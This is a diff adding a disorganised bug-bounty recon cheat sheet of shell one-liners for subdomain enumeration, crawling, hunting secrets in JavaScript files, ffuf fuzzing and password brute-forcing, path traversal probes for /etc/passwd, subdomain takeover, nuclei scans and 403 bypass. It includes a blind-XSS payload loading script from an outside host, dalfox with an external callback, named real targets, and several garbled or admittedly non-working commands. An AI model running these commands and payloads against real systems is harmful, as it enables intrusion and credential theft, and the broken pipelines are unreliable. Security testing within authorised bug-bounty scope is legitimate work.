+                cat js.txt | grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password ftp            password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret"
+                
+             nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
+             
+                              cat allurls.txt | grep -E "\.js$" >> js.txt                                                                                                    coffin
+                              cat js.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30                                        coffin
+                              cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config" >> secret.txt                                                    coffin
+                              
+                              
+                              JS Recon : WaybackURLs & HTTPX
+waybackurls url | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} python lazyegg[.]py "{}" --js_urls --domains --ips > urls && cat urls | grep '\.' | sort -u  | xargs -I{} httpx -silent -u {} -sc -title -td
+             
+             tip  
+                 cat filtered.txt | grep "\.js\b" > js-files.txt                          filtering js files after using uro to remove depulicate
+                 cat js-files.txt | httpx -mc 200 > live-js-files.txt
+                 
+                   waybackurls “site.com” | grep -Eo ‘https?://[^/]+/[^”]+\.js’ | sed ‘s|^https\?://[^/]\+/||’ | awk -F ‘/’ ‘{print $NF}’
+                   
+               cat gau.txt | grep ? | tee param.txt     /// filter out url
+                  
+              cat param.txt | grep -E '\.js$' | tee javascript.txt  filter out javascript
+               echo TARGET.com | gau | grep ".js" | httpx -content-type | grep 'application/javascript' | awk '{print $1}' | nuclei -t /root/nuclei-templates/exposures/ -silent > secrets.txt
+               
+                   search javascript file
+                 gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
+                 
+                 
+                 
+                 
+                       Javascript Enumeration 
+     =
+        arjun
+      paramspider
+      katana            katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
+      hawkrawler
+      gosipder
+      https://github.com/m4ll0k/SecretFinder
+      cat targets | xargs -n 1 -I {} python3 ~/ParamSpider/paramspider.py --subs False --domain {} --level high | urldedupe >> all-param.txt
+      cat targets.txt | hakrawler -d 5 -dr -insecure -t 10 -timeout 360 | tee hakrawler.txt
+      cat targets.txt | gospider -S - -q -d 5 -c 10 --sitemap --no-redirect -o gospider.txt
+      
+      cat jsfiles.txt  | while read url; do python3 SecretFinder.py -i $url -o cli >> secret.txt; done
+      cat secret.txt | grep API >> apikeys.txt
+check     https://github.com/gwen001/keyhacks.sh
+      ./keyhacks.sh Heroku_API_KEY b2868348-d2812-e2q28-e2002ed6630d
+      
+       tip
+      cat all_fingerprints.txt | grep "env\.js" |sort -u | uro| httpx -sc -title -server -mc 200
+      
+      Check getjs.   
+Cat domains.txt    | getjs | tojson
+And GoLinkFinder And WayBackRobots
+      
+
+      
+   
+
+hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b http://your.xss.ht
+      
+           
+          tip
+          echo "http://target.com" > target.txt
+cat traget.txt| grep ".js$" | uniq | jsleak -l -s
+cat traget.txt| grep ".js$" | uniq | jsecret
+           
+          tip  tip
+             EASIEST-WAY-TO-FIND-HIDDEN-API-FROM-JS-FILES
+      subfinder -d indeed.com -v -o subdomains.txt
+      cat subdomains.txt | waybackurls > waybackurls.txt
+      cat subdomains.txt | gau > gau.txt
+      waymore -i subdomains.txt -mode U > waymore.txt
+       Now will collect all urls into a single file naming as allurls
+        we will use extensor to find the endpoint file
+                 enter the file path :    home/the/filepath/
+                 enter the file extension  :  js
+                 enter the file name to save the url:  smart.txt
+      now we use SecretFinder to find apikeys from js file       
+       cat js.txt  | while read url; do python3 /home/kali/tools/SecretFinder/SecretFinder.py  -i $url -o cli; done   
+          It will shows all the possible credentials in js file , when you find it just report and enjoy the bounty
+          
+                  tip
+                  katana -list {domains.txt} -d 5 -jc | grep ".js$"  | uniq | sort
+                  Download SecretFinder (GitHub)
+                  cat {jsfilesgottenfromkatana.txt} | while read url; do python3 SecretFinder/SecretFinder.py  -i $url -o cli; done
+                  If anything sensitive found report it.
+         
+                  
+                  tip
+                  Subfinder -d Host.com | tee Domains.txt
+                  httpx -l Domains.txt | tee Live_Hosts.txt
+                  katana -u Live_Hosts.txt | grep ".js$" | tee Js_urls.txt
+                  cat Js_urls.txt | Mantra      check output to see if there is any api leak or token
+                   curl -H "Authorization: apikey token=X" http://Host.com/users    
+                   check if you can perform  API Calls using this token-> Add New User, Delete User ,Reset Any User Password
+                   
+                   
+                     ***  tomnonnom***
+                     gau example.net | unfurl -u paths
+                     sed 's#/#\n#g' paths.txt | sort -u         Extract all the parts
+                     gau example.net | unfurl -u keys
+                     ffuf -w paths.txt -u https://example.net/FUZZ
+
+          
+      
+  
+      # Normal Install
+      go install github.com/hakluke/hakrawler@latest
+      https://github.com/GerbenJavado/LinkFinder
+
+     # Single URL
+      echo https://target.com | hakrawler
+
+    # Multiple URLs
+     cat urls.txt | hakrawler
+
+     # Include subdomains
+      echo https://target.com | hakrawler -subs
+
+     # Get all subdomains of google, find the ones that respond to http(s), crawl them all
+     echo target.com | haktrails subdomains | httpx | hakrawler
+     #/bin/bash
+
+hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht
+
+# save to .sh, and run bash program.sh target.com
+     
+      using subjs
+    $ cat urls.txt | subjs 
+   $ subjs -i urls.txt
+                
+                15
+     SENSITIVE DISCOVERY IN JS FILES
+     
+     SecretFinder.py
+      photon
+                 
+                 
+                 
+                  
+                   PART (1)
+                 curl -L -k -s https://www.example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | awk -F '//' '{if(length($2))print "https://"$2}' | sort -fu | xargs -I '%' sh -c "curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\"" | awk -F "['\"]" '{print $2}' | sort -fu
+                 PART 2
+                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\"; basename \"%\" | xargs -I \"#\" sh -c 'linkfinder.py -o cli -i #'"
+                 
+                 part 3
+                 curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"\n##### %\";wget --no-check-certificate --quiet \"%\";curl -Lks \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
+                  part 4
+                  curl -Lks https://example.com | tac | sed "s#\\\/#\/#g" | egrep -o "src['\"]?\s*[=:]\s*['\"]?[^'\"]+.js[^'\"> ]*" | sed -r "s/^src['\"]?[=:]['\"]//g" | awk -v url=https://example.com '{if(length($1)) if($1 ~/^http/) print $1; else if($1 ~/^\/\//) print "https:"$1; else print url"/"$1}' | sort -fu | xargs -I '%' sh -c "echo \"'##### %\";curl -k -s \"%\" | sed \"s/[;}\)>]/\n/g\" | grep -Po \"('#####.*)|(['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})|(\.(get|post|ajax|load)\s*\(\s*['\\\"](https?:)?[/]{1,2}[^'\\\"> ]{5,})\" | sort -fu" | tr -d "'\""
+                 
+                       TIP  
+       ANALYZING-JAVASCRIPT-FILES-TO-FIND-BUGS-                                https://medium.com/@hrofficial62/analyzing-javascript-files-to-find-bugs-7b277d1df435
+       
+        cat domains.txt | katana | grep js | httpx -mc 200 | tee js.txt
+        nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_bugs.txt
+        grep -r -E "aws_access_key|aws_secret_key|api key|passwd|pwd|heroku|slack|firebase|swagger|aws_secret_key|aws key|password|ftp password|jdbc|db|sql|secret jet|config|admin|pwd|json|gcp|htaccess|.env|ssh key|.git|access key|secret token|oauth_token|oauth_token_secret|smtp" *.js
+
+                 
+             
+                 
+                 
+                 5
+                 find old url
+                 find all vulnerabulities in old url
+                 waybackurl, waybackmachine
+                 echo "url"  | waybackurl
+                 
+                 
+                 
+                WAYBACKURL FOR BUG HUNTING
+              # Only get all urls from wayback machine
+                      wayback_machine_downloader http://target.com -c 5 > all_urls.txt
+
+
+
+    waybackurl  (check the github usage)
+    echo "url" | waybackurl
+                 
+                
+                 
+                 waybackurls -dates https://sub.domain.com/foo/bar/ajax.php
+                 
+                 
+                 5@   virtual host
+               CONTENT DISCOVERY/PARAMS DISCOVERY  FOR BUG HUNTING     USING FFUF
+                 
+                 ffuf -w /wordlist/customlist/al.txt -c -u https://smart.com/FUZZ
+                  Fuzzing using  (Discover Hidden Endpoints)
+                  ffuf -w Discovery/Web-Content/raft-large-directories-lowercase.txt:FUZZ -u http://target.com/FUZZ
+                   for extension discovery 
+                   ffuf -w /opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://target.com/blog/indexFUZZ
+                   Discover Get Params 
+                ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://target.com/admin/admin.php?FUZZ=key -fs unique-fs-value
+                   ffuf -w /home/kali/Desktop/wordlist/fuzz.txt -recursion -u https://mktgadt.example.com/FUZZ          found  https://mktgadt.example.com/audience/login
+                   
+                   using ffuf to Fuzz  password and email                https://hackermater.medium.com/use-ffuf-to-bypass-burp-suite-intruder-attacks-delay-c5087c912741
+                   ffuf -request request.txt --request-proto https -mode pitchfork -w passwords.txt:FUZZPASSWD -w usernames.txt:FUZZUSERS -rate 5 
+                  ffuf -request request.txt --request-proto http -mode pitchfork -w /usr/share/wordlists/rockyou.txt:FUZZPASSWD -w  email-list.txt:FUZZEMAIL -mc 200 -u http://127.0.0.1:3000
+                  
+                  
+                  ffuf -w wordlist.txt -u https://host.name/indexFUZZ                to find files with differnet extension
+                  ffuf -fc 301,302 -w wordlist.txt -u https://host.name/FUZZ                                filter out 301,302
+                  ffuf -rate 50 -w wordlist.txt -u https://host.name/FUZZ                                       rate limit -rate          allways use this
+                  
+                  ffuf -w ids.txt -u https://host.name/index.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded'                   a specific parameter
+                  
+              This sends POST requests to discover parameter names. For instance, it will test parameters like `username`, `password`, and `email` in the POST data.
+                ffuf -w wordlist.txt -u https://host.name/index.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded'
+
+         ____    ____             ____
+                   
+                   Subdomain Fuzzing
+       ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
+       ffuf -u https://FUZZ.globe.gov -w /usr/share/wordlists/dirb/common.txt -p 1
+        ffuf  -u https://globe.gov -w /usr/share/wordlists/dirb/common.txt -H "Host: FUZZ.globe.gov"
+        ffuf -u https://ffuf[.]me/FUZZ -w  wordlist.txt -mc all -fc 404,302
+        ffuf -u http://ffuf[.]me/cd/recursion/FUZZ -w wordlists.txt -recursion 
+        ffuf -u http://ffuf[.]me/cd/ext/logs/FUZZ -w wordlist.txt -e .log,.bak,.conf 
+        ffuf -w wordlists.txt -u http://ffuf[.]me/FUZZ -ac
+        ffuf -w subdomains.txt -H "Host: FUZZ[.]ffuf[.]me" -u http://ffuf[.]me
+        
+         
+         BURP SUIT
+        ffuf -request req.txt -request-proto https -w lfi.txt  -c -mr "root:"        check coffins youtube about ffuf
+        req.txt is your raw data of burp with the FUZZ on it
+-request-proto is if site is https or http
+-w wordlist 
+-mr for match regex
+        
+           tip  tip
+           always do subdomain fuzzing
+           admin-FUZZ.target.com E.G: admin-stg.target.com
+FUZZ-admin.target.com E.G: cert-admin.target.com
+adminFUZZ.target.com  E.G: admintest.target.com
+FUZZadmin.target.com  E.G  testadmin.target.com
+admin.FUZZ.target.com E.G: admin.dev.target.com
+
+    example    found    admintest.Target.com
+    ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
+        
+        
+            
+            USING GOOGLE  ON COTENT DISCOVERY
+            site:example.com filetype:mdf
+            site:example.com filetype:zip
+            site:example.com filetype:sql
+            site:example.com filetype:db
+            site:example.com filetype:pdf
+            site:trello.com "target"
+            site:pastebin.com "target" — leaks
+            site:codepen.io "target" — source code.
+               Check Bing, Yandex, Duckduckgo,
+            
+
+
+                  
+                  
+                  waybackurls target.com | grep "\\.js"|uniq|sort
+                 waybackurls target.com | grep "\\.js" | xargs -n1 -I@ curl -k @ | tee -a content.txt   
+                 
+                 
+                 cat domains.txt | waybackurls > urls.txt    
+                 
+                 for xss
+        waybackurls testphp.vulnweb.com | gf xss | sed 's/=.*/=/' | sort -u | tee Possible_xss.txt && cat Possible_xss.txt | output.txt
+                   
+                    echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
+                    
+                    
+                    6
+                     SORTING OUT URL 
+                    gf,
+              
+                   cat | gf redirect | tee redirect.txt 
+                   
+                   echo example.com | waybackurls | sort -u >> waybackdata | gf xss | tee -a xssrparams.txt
+
+                   # Search for testing point with gau and fff
+                   gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
+                     sort -u urls.txt | fff -s 200 -o out/
+
+                 If you are using gau to fetch some archive data, make sure to exclude a lot of extensions with --blacklist flag:
+               cat t | gau --subs --blacklist png,jpg,jpeg,gif,mp3,mp4,svg,woff,woff2,etf,eof,otf,css,exe,ttf,eot
+
+      Extracts Juicy Informations  Extracts Juicy Informations    Extracts Juicy Informations                                             ///this didnt work
+    for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done                                                               
+
+       *****       check  cariddi                 https://github.com/edoardottt/cariddi
+                     Take a list of domains, crawl urls and scan for endpoints, secrets, api keys, file extensions, tokens and more
+
+
+               AUTOMATIC REPLACE WITH PAYLOAD
+               qsreplace .. check github
+               
+            
+
+               
+               10
+               visual recon
+                 eyewitness --web -f uniq.txt -d /path_to_save_screenshots  
+                 python3 EyeWitness.py -f  alive_subs.txt  --web --threads 10
+                    
+                 aquatone 
+                 cat targets.txt | aquatone
+                 $ cat hosts.txt | aquatone -ports 80,443,3000,3001
+                 
+                 
+                 https://github.com/sensepost/gowitness/
+                    gowitness file alive_subs.txt
+                        Run the Report server
+                                   gowittness server
+               
+               11
+               google dorking
+               12
+               github doeking
+               https://www.lopseg.com.br/dork-helper#accessedLinks
+               https://github.com/gwen001/github-subdomains
+               
+               13
+               shodan dorking   check my shodan dorks
+               - Tips :
+1_ Go to SHODAN and get the IP
+
+ 2 _ Go to Dirsearch and do a Fuzzing
+
+3_ Obtaining sensitive data
+               
+               tip
+               https://systemweakness.com/using-shodan-to-find-and-exploit-ftp-servers-with-anonymous-access-a-step-by-step-guide-86a5b6e72f75
+               Using Shodan to Find and Exploit FTP Servers with Anonymous Access: A Step-by-Step Guide
+               
+               
+               
+
+   
+               16
+                SUBDOMAIN TAKEOVER        scna and still never relay on can you takeover xyx
+                subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl                                        coffin
+                https://github.com/Cyber-Guy1/Subdomainer
+                https://github.com/anshumanbh/tko-subs
+                https://rivalsec.github.io/blog/2022/12/02/meteor.html
+                  https://tanishqshahsays.medium.com/mastering-subdomain-takeovers-c9a531fe5d3b
+                  https://infosecwriteups.com/meteor-subdomain-takeover-b33034a44aa7
+                  https://freedium.cfd/https://medium.com/@BrownBearSec/what-i-learnt-from-reading-217-subdomain-takeover-bug-reports-c0b94eda4366
+                  https://hacktivistattacker.medium.com/dns-resolutions-guide-to-subdomain-takeovers-vertical-recon-9da92433e973
+                  
+                  
+     Hostilesubruteforce
+     ruby sub-brute.rb
+     
+     sub404
+     python3 sub404.py  -f
+     
+     subjack
+         subjack -w subdomain.txt
+     
+     bbot
+    pipx install bbot
+     bbot -t evilcorp.com -f subdomain-enum
+     bbot -t evilcorp.com -f subdomain-enum -rf passive             //passive enum
+     httpx -l subdomains.txt -o live_subdomains.txt
+     
+     
+     METHODOLOGY             
+     checck for subdomian using amass, sublistr  and  axiom // check axiom 
+    
+       httpx -l subdomains.txt -o live_subdomains.txt       for live subdomian
+       subfinder -d example.com | httpx -sc 404 | tee list.txt
+          : Proceed to manually inspect each subdomain flagged with a 404 response code
+          NOTE
+              Pay close attention to any clues or information provided, especially indications of unclaimed S3 buckets or other relevant details. Additionally, use the ‘dig’ command to investigate the CNAME (Canonical Name) records. For instance, utilizing dig command enables the retrieval of the CNAME, revealing where the original subdomain directs to. This step is important in a successful domain takeover.
+             dig mail.example.com 
+              check this GitHub repo Can I Take Over XYZ
+              
+       
+       OR
+       use nuclei template to identify
+       nuclei -l subdomain_results.txt -t <nuclei_template_path> -o results.txt
+            https://github.com/projectdiscovery/nuclei-templates/tree/main/http/takeovers
+            https://github.com/projectdiscovery/nuclei-templates/tree/main/dns
+  
+    
+     GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
+     site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
+     | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
+     
+     cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"
+     
+       tip on subdomain takeover
+          using altdnx  or altex tool
+          provide a list of sudomain wordlist and map it to an subdomains
+          
+         altdns -i subdomains.txt -o data_output -w words.txt -r -s results_output.txt           //   dont work , i will check back
+         use  httpx 
+          httpx  results_output.txt  -sc 404   
+          manually check for 404 subdomain  
+                 
+      17
+      download and install    https://github.com/projectdiscovery/nuclei-ai-extension
+      
+     using nuclie  and nuclie templete
+     nuclei -l targets.txt -fr -sa -headless -threads 100 -o nuclei.out -user-agent "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6284.218 Safari/537.36" 
+     cat targets.txt | nuclei -t your-template.yaml -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0" -H "Referer: 127.0.0.1" -H "X-Forwarded-For: 127.0.0.1"
+
+     nuclei --list subdomains_alive.txt --tags cves,osint,tech                                                            coffins
+     nuclei --list dirs.txt -c 70 -rl 200 -fhr -lfa -o nuclei.txt -es info
+     nuclei -u https://my.target.site    or   nuclei -l /path/to/list-of-targets.txt
+     nuclei -u my.target.site:5759
+     subfinder -d targetdomain.com -silent | httpx | nuclei -t technologies/tech-detect.yaml
+     nuclei -u https:// my.target.site -as      fingerprint website technology
+     nuclei -u https://my.target.site -t file/logs/python-app-sql-exceptions.yaml -t exposures/files/pyproject-disclosure.yaml  
+     user@kali:~/nuclei-templates$ nuclei -u https://my.target.site -t templates-35.txt
+     nuclei -u https://my.target.site -t file/logs -t exposures/files -t cves/2021
+      nuclei -u https://example.com -t ./cent-nuclei-templates -tags cve
+      nuclei -l urls.txt -t ./cent-nuclei-templates -tags cve
+       nuclei -u https://example.com -t nuclei-templates -tags cve
+        nuclei -l urls.txt -t nuclei-templates -tags cve
+        
+        nuclei -l targets.txt -t CVE-2023-22527.yaml           check for all terget,  A template injection vulnerability on 
+        
+        tip
+        You could pass a list of URLs to nuclei to detect file upload forms:
+cat urls.txt | nuclei -id exposed-file-upload-form
+Also, you could try remaking that template to use headless mode, which will give more results in trade of speed.
+        
+    
+       
+        
+             18
+     ADMIN LOGIN ONLINER
+     cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
+     
+     
+     CHECK FOR RCE
+     amass enum -active -d $1 -brute -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt
+   cat amass.txt | aquatone -ports xlarge -out aqua_$1
+   nuclei -l aqua_$1/aquatone_urls.txt -t ~/nuclei-templates -es info -o nuclei_$1.txt
+     403 login Bypass
+   cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
+    git-dumper http://example.com/.git/ output
+     
+     
+     recon takeway tip     recon takeway tip        recon takeway tip       recon takeway tip
+    Certificate Search
+   using crt
+   curl -s "https://crt.sh/?O=Apple%20Inc.&output=json" | jq -r ".[].common_name" | tr A-Z a-z | unfurl format %r.%t | sort -u | tee apple.cert.txt
+   
+   
+   tip     check      https://github.com/intigriti/misconfig-mapper
+   When hunting for vulnerabilities, one effective method is to look for internal domains exposed through SSL certificates . This can reveal internal infrastructure or services that might be accessible due to misconfigurations or overlooked security measures. 
+     check it on   certificate transparency , openssl, browers, Nmap, SSLScan
+   
+   Leveraging IP to Asset Discovery
+   http://ipip.net/    
+   Using CSP Headers
+     OSINT
+     subfinder -silent -dL domains.txt | anew subs.txt
+      while true; do subfinder -dL domains.txt -all | anew subs.txt | httpx | nuclei -t nuclei-templates/ | notify ; sleep 3600; don
+     
+     easy tip on bug bounty
+     search for app for technology       wappalyer
+     Shodan:  Search Query  for technology: Set-Cookie: CONCRETE5
+    To Hunt for Specific Organisation
+   Search Query: Set-Cookie: CONCRETE5 org:”Microsoft Corporation” 
+   shodan cli ->  shodan search “Set-Cookie: CONCRETE5” — fields ip_str,port — separator “ “ | awk ‘{print $1”:”$2}’ | tee -a shodan-concrete-ips.txt
+   Censys
+    Search Query: 443.https.get.body:concrete5
+    Writing Nuclei Template  of other vun
+    
+    
+    19
+    cors
+    python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+    
+    
+      
+       FAST RECON      FAST RECON
+
+subfinder -d viator.com -all  -recursive > subdomain.txt
+
+cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
+naabu -list subdomains.txt  -c 50 -nmap-cli 'nmap -sV -sC'  -o naabu-full.txt
+
+katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
+
+cat   subdomains_alive.txt | gau > newparms.txt
+cat newparms.txt | uro > filterparm.txt
+cat  filterparam.txt | grep ".js$" > jsfiles.txt
+
+
+cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
+
+
+cat allurls.txt | grep -E "\.js$" >> js.txt
+
+cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ 
+
+echo www.viator.com | katana -ps | grep -E "\.js$" | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/ -c 30
+
+dirsearch  -u https://www.viator.com -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,http://sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,.log,.xml,.js.,.json
+
+dirsearch -l subdomains_alive.txt  -i 200,204,403 -x 500,502,429 -R 5 --random-agent -t 50 -F -w /home/coffinxp/oneforall/onelistforallshort.txt -o directory.txt
+
+
+cat   subdomains_alive.txt | gau > newparms.txt
+cat newparms.txt | uro > filterparm.txt
+
+subfinder -d viator.com | httpx-toolkit -silent |  katana -ps -f qurl | gf xss | bxss -appendMode -payload '"><script src=https://xss.report/c/coffinxp></script>' -parameters
+
+subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl
+
+python3 corsy.py -i /home/coffinxp/vaitor/subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
+
+nuclei -list subdomains_alive.txt -t /home/coffinxp/Priv8-Nuclei/cors
+
+nuclei  -list ~/vaitor/subdomains_alive.txt -tags cve,osint,tech
+
+cat allurls.txt | gf lfi | nuclei -tags lfi
+cat allurls.txt | gf redirect | openredirex -p /home/coffinxp/openRedirect
+
+
+
+
+
+tip
+  https://x.com/wadgamer10/status/1809475857003446413
+    How i am hunting for phpmyadmin logins:-
+
+nuclei -l live-subs.txt -t nuclei-templates/http/exposed-panels/phpmyadmin-panel.yaml
+
+## Then :-
+
+- Test for default creds : root & password,..etc
+- Fuzzing 
+- Test SQLi
+- Response Manipulation
+
+
+    JENKINS    SECERT  SCANING         JENKINS    SECERT  SCANING                                          https://trufflesecurity.com/blog/trufflehog-now-scans-jenkins-logs
+    
+    trufflehog jenkins --url https://jenkins.example.com --username admin --password admin
+      trufflehog jenkins --url https://jenkins.example.com
+      trufflehog git file://./ --only-verified
 
 
 
@@ -181,10 +1281,237 @@ how to use files everywhere
 
 
     
+    
+                               gauplus
+                   cat domain.txt | gauplus -subs | grep -i "\.xlsx" allurls.txt | anew xlsx.txt
+                    cat domain.txt | gauplus -subs | grep -i "\.sql" allurls.txt | anew sql.txt
+                     cat domain.txt | gauplus -subs | grep -i "\.log" allurls.txt | anew log.txt
+                      cat domain.txt | gauplus -subs | grep -i "\.bak" allurls.txt | anew bak.txt
+                       cat domain.txt | gauplus -subs | grep "=" | Gxss -c 100 | anew reflected.txt
+          cat domain.txt | gauplus -subs | grep "=" > url.txt; httpx -l url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:'
+          
+       cat domain.txt | gauplus -subs | qsreplace "<intearcst-client domain>" | httpx     ssrf
+        cat domain.txt | gauplus -subs | grep -i "\.js$" > jsfiles.txt; while read url; do python3 secretfinder.py -l "$url"; done<jsfiles.txt
+          cat domain.txt | gauplus -subs | httpx -sc -nc | grep "403\|401" | anew unauted.txt      check 403 bypass github
+          
+          cat domain.txt | gauplus -subs | httpx -title | grep -l "admin\|login\|dashboard" | anew loginpanel.txt   //add more keyword
+          
+          
+                 5MIN ADMIN PANEL ACCESSED PAYLOAD
+cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -q txt | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | grep -vi -e dalfox -e lElLxtainw| sort -u | waybackurls
+          
+          
+          /SUBDOMAIN-FUZZING-WORTH-35K-
+          ffuf -w /subdomain_megalist.txt -u 'https://adminFUZZ.Target.com' -c  -t 350 -mc all  -fs 0
+          Using Burp Match And Replace or using Burp intercept response by
+
+         change 302 Moved Temporarily to 200 OK
+          remove Location: /admin/Login.aspx?logout=y
+         remove html redirect code 
+      ***   1_Always check the redirect response in burp
+    ****  2_ If u found a bug in a subdomain and it fixed try Subdomain Fuzzing
+              you can use it this way
+
+     USING
+        FUZZ-admin.target.com E.G: cert-admin.target.com
+         adminFUZZ.target.com  E.G: admintest.target.com
+          FUZZadmin.target.com  E.G  testadmin.target.com
+          admin-FUZZ.target.com E.G: admin-stg.target.com
+         admin.FUZZ.target.com E.G: admin.dev.target.com 
+          
+          
+
+              KATANA
+              tip on katana
+              When using katana: 
+
+1) use "-headless" as modern CDN WAFs block many command-line spiders. 
+
+2) use "-js-crawl" to enable  javascript parsing
+
+3) use "-jsluice" to enable syntax-tree (better) javascript parsing
+
+4) use "-display-out-scope" to know when the spider find links to other domains that might be related to your target
+ 
+ cat domains.txt | katana | grep js | httpx -mc 200 | tee js.txt
+ katana -list targets.txt -silent -d 6 -rl 25 -jc -f qurl
+ katana -list targets.txt -silent -d 6 -rl 25 -jc -f qurl -headless -js-crawl -jsluice -display-out-scope                               //check again. it didint work with ggpoker , the output was low 
+ 
+ katana -u vulnweb.com -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl -jc -xhr -kf -fx -fs dn -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg
+
+ echo "https://yoursite.com"| katana -passive -pss waybackarchive,commoncrawl,alienvault -f qurl | gf sqli | uro |  nuclei -t prsnltemplates/bsqli-time-based.yaml --dast
+ 
+ katana -u vulnweb.com -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl -jc -xhr -kf -fx -fs dn -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg       // Effective way to crawl juicy endpoints
+              
+          katana -list url_list.txt
+          
